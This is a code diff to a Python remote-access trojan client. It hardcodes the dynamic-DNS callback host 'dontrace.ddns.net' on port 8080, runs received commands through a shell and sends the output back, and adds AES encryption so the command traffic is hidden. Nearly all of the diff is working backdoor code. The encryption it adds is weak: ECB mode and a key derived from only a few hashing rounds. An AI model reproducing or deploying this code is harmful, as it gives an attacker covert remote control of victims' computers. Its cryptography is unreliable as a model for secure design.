@@ -9,8 +9,83 @@ import platform
 import ctypes
 import hashlib
 import Crypto
-from Crypto.PublicKey import RSA
+import Crypto.Random
 from Crypto.Cipher import AES
+from Crypto.PublicKey import RSA
+
+
+# salt size in bytes
+SALT_SIZE = 16
+
+# number of iterations in the key generation
+NUMBER_OF_ITERATIONS = 20
+
+# the size multiple required for AES
+AES_MULTIPLE = 16
+
+def generate_key(password, salt, iterations):
+    assert iterations > 0
+
+    key = password + salt
+
+    for i in range(iterations):
+        key = hashlib.sha256(key).digest()  
+
+    return key
+
+def pad_text(text, multiple):
+    extra_bytes = len(text) % multiple
+
+    padding_size = multiple - extra_bytes
+
+    padding = chr(padding_size) * padding_size
+
+    padded_text = text + padding
+
+    return padded_text
+
+def unpad_text(padded_text):
+    padding_size = ord(padded_text[-1])
+
+    text = padded_text[:-padding_size]
+
+    return text
+
+def encrypt(plaintext, password):
+    salt = Crypto.Random.get_random_bytes(SALT_SIZE)
+
+    key = generate_key(password, salt, NUMBER_OF_ITERATIONS)
+
+    cipher = AES.new(key, AES.MODE_ECB)
+
+    padded_plaintext = pad_text(plaintext, AES_MULTIPLE)
+
+    ciphertext = cipher.encrypt(padded_plaintext)
+
+    ciphertext_with_salt = salt + ciphertext
+
+    return ciphertext_with_salt
+
+def decrypt(ciphertext, password):
+    salt = ciphertext[0:SALT_SIZE]
+
+    ciphertext_sans_salt = ciphertext[SALT_SIZE:]
+
+    key = generate_key(password, salt, NUMBER_OF_ITERATIONS)
+
+    cipher = AES.new(key, AES.MODE_ECB)
+
+    padded_plaintext = cipher.decrypt(ciphertext_sans_salt)
+
+    plaintext = unpad_text(padded_plaintext)
+
+    return plaintext
+
+
+
+
+
+
 
 
 
@@ -74,12 +149,12 @@ def connect():
     
     #rmdomain is the freee dynamic domain name you created for your server it should be easy to configure it just download noip client 
     #start the client, configure your router/firewall to redirect traffic for port 8080 to your internal server and that should be it
-    #example : rmdomain='test.ddns.net'
-    while True:
-    		rhost=socket.gethostbyname(rmdomain)
-    		if s.connect_ex((rhost,8080))==0:
-    			break
     
+    rmdomain='dontrace.ddns.net'
+    while True:
+    	rhost=socket.gethostbyname(rmdomain)
+    	if s.connect_ex((rhost,8080))==0:
+    		break
     
     os=str(platform.system())
 
@@ -101,9 +176,10 @@ def connect():
 
     s.send(secret)
 
-
     while True: 
-        command=s.recv(1024)
+        
+        command=decrypt(s.recv(1024),secret)
+
         if 'terminate' in command:
             s.close()
             break 
@@ -117,8 +193,13 @@ def connect():
             change_desktop_bg(s,command)
         else:
             CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            s.send( CMD.stdout.read())
-            s.send( CMD.stderr.read())
+            out=CMD.stdout.read()
+            err=CMD.stderr.read()
+            if err:
+                s.send(encrypt(err,secret) )
+            else :
+                s.send(encrypt(out,secret) )
+            
 
 def main ():
     connect()
